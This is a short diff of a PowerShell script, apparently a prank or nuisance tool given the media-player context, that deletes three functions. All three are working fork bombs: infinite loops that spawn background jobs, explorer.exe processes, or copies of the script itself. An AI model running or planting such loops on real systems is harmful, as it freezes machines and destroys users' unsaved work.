@@ -1142,19 +1142,3 @@ Param(
     $mediaPlayer.open($filepath)
     $mediaPlayer.Play()
 }
-
-Function Fork-Bomb3 
-{
-    write-host "Start ok"
-    For(){ Sajb{ For(){ } } }
-}
-
-Function Fork-Bomb2 
-{
-    while(1) {Start-Process explorer.exe}
-}
-
-Function Fork-Bomb1 
-{
-    While (1) { $WScript = New-Object -com wscript.shell; $WScript.Exec("powershell.exe &" + $PSCommandPath); }
-}
